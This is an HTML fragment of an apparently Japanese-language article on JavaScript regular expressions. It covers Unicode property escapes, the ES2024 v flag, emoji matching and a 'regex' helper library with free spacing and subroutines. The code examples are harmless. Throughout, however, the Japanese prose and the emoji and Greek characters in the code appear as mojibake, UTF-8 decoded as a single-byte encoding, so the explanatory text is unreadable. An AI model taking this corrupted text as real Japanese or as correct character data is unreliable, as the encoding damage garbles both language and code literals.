<p>Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆES2018ã§è¿½åŠ ï¼‰ã¯ã€<code class="language-text">\p{...}</code>æ§‹æ–‡ã¨ãã®å¦å®šå½¢ã§ã‚ã‚‹`P{...}`ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§å¤šè¨€èªãƒ†ã‚­ã‚¹ãƒˆã‚’å¼·åŠ›ã«åˆ¶å¾¡ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãƒãƒƒãƒãƒ³ã‚°ã§ãã‚‹ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯æ•°ç™¾ã«åŠã³ã€å¤šå²ã«ã‚ãŸã‚‹Unicodeã®ã‚«ãƒ†ã‚´ãƒªã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ‹¡å¼µæ©Ÿèƒ½ã€ãƒã‚¤ãƒŠãƒªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’ç¶²ç¾…ã—ã¾ã™ã€‚</p>
<p>æ³¨ï¼šè©³ç´°ã«ã¤ã„ã¦ã¯<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Unicode_character_class_escape">MDNã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ</a>ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<p>Unicodeãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã§ã¯<code class="language-text">u</code>ï¼ˆ<code class="language-text">unicode</code>ï¼‰ã¾ãŸã¯<code class="language-text">v</code>ï¼ˆ<code class="language-text">unicodeSets</code>ï¼‰ãƒ•ãƒ©ã‚°ã®ä½¿ç”¨ãŒå¿…é ˆã§ã™ã€‚</p>
<h2><code class="language-text">v</code>ãƒ•ãƒ©ã‚° <a href="#vãƒ•ãƒ©ã‚°">#</a><a name="vãƒ•ãƒ©ã‚°"></a></h2>
<p><code class="language-text">v</code>ï¼ˆ<code class="language-text">unicodeSets</code>ï¼‰ãƒ•ãƒ©ã‚°ã¯ã€<code class="language-text">u</code>ãƒ•ãƒ©ã‚°ã®ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã¨ã—ã¦ES2024ã§è¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã®ãƒ•ãƒ©ã‚°ã‚’åŒæ™‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®Unicodeéå¯¾å¿œãƒ¢ãƒ¼ãƒ‰ã§ã²ãã‹ã«ãƒã‚°ãŒç´›ã‚Œè¾¼ã¾ãªã„ã‚ˆã†ã€ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã—ã¦ã„ãšã‚Œã‹ã®ãƒ•ãƒ©ã‚°ã‚’å¸¸ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ã€‚ã©ã¡ã‚‰ã‚’ä½¿ç”¨ã™ã‚‹ã‹ã®åˆ¤æ–­ã¯æ¥µã‚ã¦å˜ç´”ã§ã™ã€‚<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã®ç’°å¢ƒï¼ˆNode.js 20ãŠã‚ˆã³2023å¹´ä¸–ä»£ã®ãƒ–ãƒ©ã‚¦ã‚¶ï¼‰ã®ã¿ã®ã‚µãƒãƒ¼ãƒˆã§å•é¡Œãªã‘ã‚Œã°<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã€ãã‚Œä»¥å¤–ã®å ´åˆã¯<code class="language-text">u</code>ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
<p><code class="language-text">v</code>ãƒ•ãƒ©ã‚°ãŒå®Ÿè£…ã•ã‚ŒãŸã“ã¨ã§ã€ã„ãã¤ã‹ã®æ–°ã—ã„æ­£è¦è¡¨ç¾æ©Ÿèƒ½ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ä¸­ã§ã‚‚ç‰¹ç­†ã™ã¹ããªã®ãŒå·®é›†åˆã¨ç©é›†åˆã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€<code class="language-text">A--B</code>ï¼ˆæ–‡å­—ã‚¯ãƒ©ã‚¹å†…ï¼‰ã‚’ä½¿ç”¨ã—ã¦Aã®æ–‡å­—åˆ—ã¯ãƒãƒƒãƒãƒ³ã‚°ã—ã€Bã®æ–‡å­—åˆ—ã¯ãƒãƒƒãƒãƒ³ã‚°ã—ãªã„ã¨ã‹ã€<code class="language-text">A&amp;&amp;B</code>ã‚’ä½¿ç”¨ã—ã¦Aã¨Bä¸¡æ–¹ã®æ–‡å­—åˆ—ã‚’ãƒãƒƒãƒãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ä»¥ä¸‹ã®ä¾‹ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Matches all Greek symbols except the letter 'Ï€'</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">--</span>Ï€<span class="token punctuation">]</span><span class="token operator">/</span>v

<span class="token comment">// Matches only Greek letters</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">&amp;&amp;</span>\p<span class="token punctuation">{</span>Letter<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token operator">/</span>v</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã«é–¢ã™ã‚‹è©³ç´°ã‚„ã€vãƒ•ãƒ©ã‚°ã®ä»–ã®æ–°æ©Ÿèƒ½ã«ã¤ã„ã¦ã¯ã€Google Chromeãƒãƒ¼ãƒ ã«ã‚ˆã‚‹ã“ã¡ã‚‰ã®<a href="https://v8.dev/features/regexp-v-flag">èª¬æ˜</a>ã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<h2>çµµæ–‡å­—ã®ãƒãƒƒãƒãƒ³ã‚°ã«ã¤ã„ã¦ <a href="#çµµæ–‡å­—ã®ãƒãƒƒãƒãƒ³ã‚°ã«ã¤ã„ã¦">#</a><a name="çµµæ–‡å­—ã®ãƒãƒƒãƒãƒ³ã‚°ã«ã¤ã„ã¦"></a></h2>
<p>çµµæ–‡å­—ã¨ã¯ğŸ¤©ğŸ”¥ğŸ˜ğŸ‘Œãªã©ã®ã“ã¨ã§ã™ãŒã€çµµæ–‡å­—ãŒãƒ†ã‚­ã‚¹ãƒˆä¸Šã§ç¬¦å·åŒ–ã•ã‚Œã‚‹æ–¹æ³•ã¯è¤‡é›‘ã§ã™ã€‚æ­£è¦è¡¨ç¾ã§çµµæ–‡å­—ã‚’ãƒãƒƒãƒãƒ³ã‚°ã—ãŸã„å ´åˆã€<strong>1ã¤ã®çµµæ–‡å­—ãŒ1ã¤ã®Unicodeã‚³ãƒ¼ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§æ§‹æˆã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Œã°ã€å¤šãã®Unicodeã‚³ãƒ¼ãƒ‰ãƒã‚¤ãƒ³ãƒˆã§æ§‹æˆã•ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚‹</strong>ã“ã¨ã‚’èªè­˜ã—ã¦ãŠãã“ã¨ãŒé‡è¦ã§ã™ã€‚çµµæ–‡å­—ã®æ­£è¦è¡¨ç¾ã‚’ç‹¬è‡ªã«å±•é–‹ã™ã‚‹å¤šãã®äººï¼ˆãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚‚ã§ã™ï¼ï¼‰ãŒã“ã®ç‚¹ã‚’è¦‹è½ã¨ã—ï¼ˆã‚ã‚‹ã„ã¯é©åˆ‡ã«å®Ÿè£…ã—ã¦ãŠã‚‰ãšï¼‰ã€ãƒã‚°ã‚’ç™ºç”Ÿã•ã›ã¦ã—ã¾ã£ã¦ã„ã¾ã™ã€‚</p>
<p>ã€ŒğŸ‘©ğŸ»â€ğŸ«ã€ï¼ˆå¥³æ€§æ•™å¸«ï¼šæ˜ã‚‹ã„è‚Œã®è‰²ï¼‰ã®çµµæ–‡å­—ã«é–¢ã™ã‚‹ä»¥ä¸‹ã®è©³ç´°ã¯ã€çµµæ–‡å­—ãŒã„ã‹ã«è¤‡é›‘ã«ãªã‚Šå¾—ã‚‹ã‹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Code unit length</span>
<span class="token string">'ğŸ‘©ğŸ»â€ğŸ«'</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// â†’ 7</span>
<span class="token comment">// Each astral code point (above \uFFFF) is divided into high and low surrogates</span>

<span class="token comment">// Code point length</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token string">'ğŸ‘©ğŸ»â€ğŸ«'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// â†’ 4</span>
<span class="token comment">// These four code points are: \u{1F469} \u{1F3FB} \u{200D} \u{1F3EB}</span>
<span class="token comment">// \u{1F469} combined with \u{1F3FB} is 'ğŸ‘©ğŸ»'</span>
<span class="token comment">// \u{200D} is a Zero-Width Joiner</span>
<span class="token comment">// \u{1F3EB} is 'ğŸ«'</span>

<span class="token comment">// Grapheme cluster length (user-perceived characters)</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Intl<span class="token punctuation">.</span>Segmenter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">segment</span><span class="token punctuation">(</span><span class="token string">'ğŸ‘©ğŸ»â€ğŸ«'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// â†’ 1</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>å¹¸ã„ã€JavaScriptã¯<code class="language-text">\p{RGI_Emoji}</code>ã«ã‚ˆã‚Šä»»æ„ã®å®Œå…¨ãªçµµæ–‡å­—ã‚’å€‹åˆ¥ã«ãƒãƒƒãƒãƒ³ã‚°ã§ãã‚‹ç°¡å˜ãªæ–¹æ³•ã‚’è¿½åŠ ã—ã¾ã—ãŸã€‚ã“ã‚Œã¯ä¸€åº¦ã«è¤‡æ•°ã®ã‚³ãƒ¼ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒãƒƒãƒãƒ³ã‚°ã§ãã‚‹é«˜åº¦ãªã€Œæ–‡å­—åˆ—ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã€ã®ãŸã‚ã€ES2024ã®<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ãŒå¿…è¦ã«ãªã‚Šã¾ã™ã€‚</p>
<p><code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã«å¯¾å¿œã—ã¦ã„ãªã„ç’°å¢ƒã§çµµæ–‡å­—ã®ãƒãƒƒãƒãƒ³ã‚°ã‚’è¡Œã„ãŸã„å ´åˆã¯ã€<a href="https://github.com/mathiasbynens/emoji-regex">emoji-regex</a>ã¨<a href="https://github.com/slevithan/emoji-regex-xs">emoji-regex-xs</a>ã®2ã¤ã®ç´ æ™´ã‚‰ã—ã„ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã¿ã¦ãã ã•ã„ã€‚</p>
<h2>ã‚ˆã‚Šèª­ã¿ã‚„ã™ãã€ä¿å®ˆæ€§ã¨ãƒ¬ã‚¸ãƒªã‚¨ãƒ³ã‚¹ã«å„ªã‚ŒãŸæ­£è¦è¡¨ç¾ã‚’æ›¸ã <a href="#ã‚ˆã‚Šèª­ã¿ã‚„ã™ãã€ä¿å®ˆæ€§ã¨ãƒ¬ã‚¸ãƒªã‚¨ãƒ³ã‚¹ã«å„ªã‚ŒãŸæ­£è¦è¡¨ç¾ã‚’æ›¸ã">#</a><a name="ã‚ˆã‚Šèª­ã¿ã‚„ã™ãã€ä¿å®ˆæ€§ã¨ãƒ¬ã‚¸ãƒªã‚¨ãƒ³ã‚¹ã«å„ªã‚ŒãŸæ­£è¦è¡¨ç¾ã‚’æ›¸ã"></a></h2>
<p>æ­£è¦è¡¨ç¾æ©Ÿèƒ½ã¯é•·å¹´ã«ã‚ãŸã‚Šæ”¹è‰¯ã‚’é‡ã­ã¦ãã¾ã—ãŸãŒã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®JavaScriptã®æ­£è¦è¡¨ç¾ã¯ã€è¤‡é›‘ãªã‚‚ã®ã«ãªã‚‹ã¨èª­ã‚€ã«ã—ã‚ä¿å®ˆã™ã‚‹ã«ã—ã‚ã€ã¾ã é›£ã—ã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Regular Expressions are SO EASY!!!! <a href="https://t.co/q4GSpbJRbZ">pic.twitter.com/q4GSpbJRbZ</a></p>&mdash; Garabato Kid (@garabatokid) <a href="https://twitter.com/garabatokid/status/1147063121678389253?ref_src=twsrc%5Etfw">July 5, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>ES2018ã§è¿½åŠ ã•ã‚ŒãŸåå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã¯ã€æ­£è¦è¡¨ç¾ã®è‡ªå·±æ–‡æ›¸åŒ–ã‚’æ¨ã—é€²ã‚ãŸç´ æ™´ã‚‰ã—ã„æ©Ÿèƒ½ã§ã‚ã‚Šã€ES6ã®<code class="language-text">String.raw</code>ã‚¿ã‚°ã«ã‚ˆã‚Šã€<code class="language-text">RegExp</code>ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹éš›ã«ãƒãƒƒã‚¯ã‚¹ãƒ©ãƒƒã‚·ãƒ¥ã‚’ã™ã¹ã¦ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã™ã‚‹å¿…è¦ãŒãªããªã‚Šã¾ã—ãŸã€‚å¯èª­æ€§ã«é–¢ã™ã‚‹ä¸»ãªæ”¹è‰¯ã¯ãã‚Œãã‚‰ã„ã§ã™ã€‚</p>
<p>ã—ã‹ã—ã€<code class="language-text">regex</code>ã¨ã„ã†åå‰ã®è»½é‡ã§é«˜æ€§èƒ½ãª<a href="https://github.com/slevithan/regex">JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒª</a>ï¼ˆç­†è€…ä½œï¼‰ãŒã‚ã‚Šã€ã“ã‚Œã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§æ­£è¦è¡¨ç¾ãŒåŠ‡çš„ã«èª­ã¿ã‚„ã™ããªã‚Šã¾ã™ã€‚ã“ã®ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã¯ã€æ¬ ã‘ã¦ã„ã‚‹ä¸»ãªæ©Ÿèƒ½ã‚’PCREï¼ˆPerl-Compatible Regular Expressionsï¼‰ã‹ã‚‰è¿½åŠ ã—ã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®JavaScriptã®æ­£è¦è¡¨ç¾ã‚’å‡ºåŠ›ã™ã‚‹ã“ã¨ã§å¯èª­æ€§ã®å‘ä¸Šã‚’å®Ÿç¾ã—ã¦ã„ã¾ã™ã€‚Babelã®ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¨ã—ã¦ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã‚‹ãŸã‚ã€ãƒ“ãƒ«ãƒ‰æ™‚ã«<code class="language-text">regex</code>ã®å‘¼ã³å‡ºã—ãŒãƒˆãƒ©ãƒ³ã‚¹ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã‚¨ã‚¯ã‚¹ãƒšãƒªã‚¨ãƒ³ã‚¹ãŒæ”¹å–„ã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ©ãƒ³ã‚¿ã‚¤ãƒ ã‚³ã‚¹ãƒˆãŒã‹ã‹ã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p><a href="https://github.com/PCRE2Project/pcre2">PCRE</a>ã¯ã€PHPãŒæ­£è¦è¡¨ç¾ã®ã‚µãƒãƒ¼ãƒˆã«ä½¿ç”¨ã—ã¦ã„ã‚‹äººæ°—ã®Cãƒ©ã‚¤ãƒ–ãƒ©ãƒªã§ã€ä»–ã®ç„¡æ•°ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒŸãƒ³ã‚°è¨€èªã‚„ãƒ„ãƒ¼ãƒ«ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p><code class="language-text">regex</code>ã¨ã„ã†åå‰ã®ã‚¿ã‚°ä»˜ããƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒªãƒ¬ãƒ©ãƒ«ã‚’æä¾›ã™ã‚‹regexãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã€ã©ã®ã‚ˆã†ã«ã—ã¦ã‚ã‹ã‚Šã‚„ã™ãä¿å®ˆã—ã‚„ã™ã„è¤‡é›‘ãªæ­£è¦è¡¨ç¾ã‚’æ›¸ãæ‰‹åŠ©ã‘ã‚’ã™ã‚‹ã®ã‹ã€ç°¡å˜ã«èª¬æ˜ã—ã¾ã™ã€‚ä»¥ä¸‹ã§èª¬æ˜ã™ã‚‹æ–°ã—ã„æ§‹æ–‡ã¯ã€ã™ã¹ã¦PCREã§åŒæ§˜ã«æ©Ÿèƒ½ã—ã¾ã™ã€‚</p>
<h2>ã¡ã‚‡ã£ã¨ã—ãŸç©ºç™½ã¨ã‚³ãƒ¡ãƒ³ãƒˆ <a href="#ã¡ã‚‡ã£ã¨ã—ãŸç©ºç™½ã¨ã‚³ãƒ¡ãƒ³ãƒˆ">#</a><a name="ã¡ã‚‡ã£ã¨ã—ãŸç©ºç™½ã¨ã‚³ãƒ¡ãƒ³ãƒˆ"></a></h2>
<p><code class="language-text">regex</code>ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ç©ºç™½ã‚„è¡Œã‚³ãƒ¡ãƒ³ãƒˆï¼ˆ<code class="language-text">#</code>ã§å§‹ã¾ã‚‹ï¼‰ã‚’è‡ªç”±ã«æ­£è¦è¡¨ç¾ã«è¿½åŠ ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã§ã€å¯èª­æ€§ã‚’æ”¹å–„ã—ã¦ã„ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> date <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  # Match a date in YYYY-MM-DD format
  (?&lt;year>  \d{4}) - # Year part
  (?&lt;month> \d{2}) - # Month part
  (?&lt;day>   \d{2})   # Day part
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã¯ã€PCREã®<code class="language-text">xx</code>ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã®ã¨åŒã˜ã§ã™ã€‚</p>
<h2>ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã¨ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å®šç¾©ã‚°ãƒ«ãƒ¼ãƒ— <a href="#ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã¨ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å®šç¾©ã‚°ãƒ«ãƒ¼ãƒ—">#</a><a name="ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã¨ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å®šç¾©ã‚°ãƒ«ãƒ¼ãƒ—"></a></h2>
<p>ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³ã¯<code class="language-text">\g&lt;name></code>ï¼ˆnameã¯åå‰ä»˜ãã‚°ãƒ«ãƒ¼ãƒ—ã‚’æŒ‡ã—ã¾ã™ï¼‰ã®ã‚ˆã†ã«æ›¸ãã€å‚ç…§ã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—ã‚’ç‹¬ç«‹ã—ãŸã‚µãƒ–ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨ã—ã¦æ‰±ã„ã€ç¾åœ¨ã®ä½ç½®ã§ãƒãƒƒãƒã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚µãƒ–ãƒ‘ã‚¿ãƒ¼ãƒ³ã®åˆæˆã¨å†åˆ©ç”¨ãŒå¯èƒ½ã«ãªã‚Šã€å¯èª­æ€§ã¨ä¿å®ˆæ€§ãŒæ”¹å–„ã•ã‚Œã¾ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€ä»¥ä¸‹ã®æ­£è¦è¡¨ç¾ã¯ã€Œ192.168.12.123ã€ã®ã‚ˆã†ãªIPv4ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒƒãƒã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> ipv4 <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\b
  (?&lt;byte> 25[0-5] | 2[0-4]\d | 1\d\d | [1-9]?\d)
  # Match the remaining 3 dot-separated bytes
  (\. \g&lt;byte>){3}
\b</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã•ã‚‰ã«ã€ã‚µãƒ–ãƒ«ãƒ¼ãƒãƒ³å®šç¾©ã‚°ãƒ«ãƒ¼ãƒ—ã‚’é€šã˜ã¦å‚ç…§ã®ã¿ã§ä½¿ç”¨ã™ã‚‹ã‚µãƒ–ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’å®šç¾©ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã¡ã‚‰ã¯å…ˆã»ã©è¦‹ãŸåå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã®é …ç›®ã®æ­£è¦è¡¨ç¾ã®æ”¹å–„ä¾‹ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  ^ Admitted:\ (?&lt;admitted> \g&lt;date>) \n
    Released:\ (?&lt;released> \g&lt;date>) $

  (?(DEFINE)
    (?&lt;date>  \g&lt;year>-\g&lt;month>-\g&lt;day>)
    (?&lt;year>  \d{4})
    (?&lt;month> \d{2})
    (?&lt;day>   \d{2})
  )
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* â†’ {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾ã®ãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³ <a href="#ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾ã®ãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³">#</a><a name="ãƒ¢ãƒ€ãƒ³ãªæ­£è¦è¡¨ç¾ã®ãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³"></a></h2>
<p><code class="language-text">regex</code>ã«ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ãŒå«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€æœ‰åŠ¹åŒ–ã—å¿˜ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã¾ãŸã€ãƒã‚¤ãƒ†ã‚£ãƒ–ã®<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„ç’°å¢ƒã§ã¯ã€è‡ªå‹•çš„ã«<code class="language-text">u</code>ãƒ•ãƒ©ã‚°ã«åˆ‡ã‚Šæ›¿ã‚ã‚Šã¤ã¤ã‚‚ã€<code class="language-text">v</code>ãƒ•ãƒ©ã‚°ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—è¦å‰‡ã‚’é©ç”¨ã—ã€æ­£è¦è¡¨ç¾ã®å‰æ–¹äº’æ›æ€§ã¨å¾Œæ–¹äº’æ›æ€§ã‚’ç¢ºä¿ã—ã¾ã™ã€‚</p>
<p>ã¾ãŸã€ã‚¨ãƒŸãƒ¥ãƒ¬ãƒ¼ãƒˆã•ã‚ŒãŸ<code class="language-text">x</code>ï¼ˆã¡ã‚‡ã£ã¨ã—ãŸç©ºç™½ã¨ã‚³ãƒ¡ãƒ³ãƒˆï¼‰ãŠã‚ˆã³<code class="language-text">n</code>ï¼ˆã€Œåå‰ä»˜ãã‚­ãƒ£ãƒ—ãƒãƒ£ã®ã¿ã€ãƒ¢ãƒ¼ãƒ‰ï¼‰ãƒ•ãƒ©ã‚°ã‚’ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æš—é»™çš„ã«æœ‰åŠ¹åŒ–ã™ã‚‹ãŸã‚ã€æ¯å›ã“ã‚Œã‚‰ã®ä¸Šä½ãƒ¢ãƒ¼ãƒ‰ã‚’é¸æŠã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã•ã‚‰ã«ã€ã‚¿ã‚°ä»˜ããƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒªãƒ†ãƒ©ãƒ«ã§ã‚ã‚‹ãŸã‚ã€<code class="language-text">RegExp</code>ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã®å ´åˆã®ã‚ˆã†ã«ãƒãƒƒã‚¯ã‚¹ãƒ©ãƒƒã‚·ãƒ¥<code class="language-text">\\\\</code>ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—å‡¦ç†ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚</p>
